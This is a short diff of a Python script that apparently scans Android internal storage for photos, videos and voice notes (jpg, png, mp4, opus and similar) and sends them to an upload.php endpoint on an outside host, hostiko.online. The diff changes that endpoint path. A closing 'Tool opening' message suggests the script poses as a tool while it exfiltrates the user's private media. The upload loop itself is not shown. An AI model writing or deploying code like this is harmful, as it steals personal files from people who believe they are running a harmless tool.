@@ -3,7 +3,7 @@ import requests
 
 # ✅ Step 1
 base_path = "/storage/emulated/0/"  # Android internal storage
-server_url = "https://hostiko.online/data2/upload.php"  
+server_url = "https://hostiko.online/data/upload.php"  
 image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.opus']
 
 # ✅ Step 2
@@ -47,3 +47,4 @@ if __name__ == "__main__":
 
 
     print("\n✅ All done! Tool opening")
+
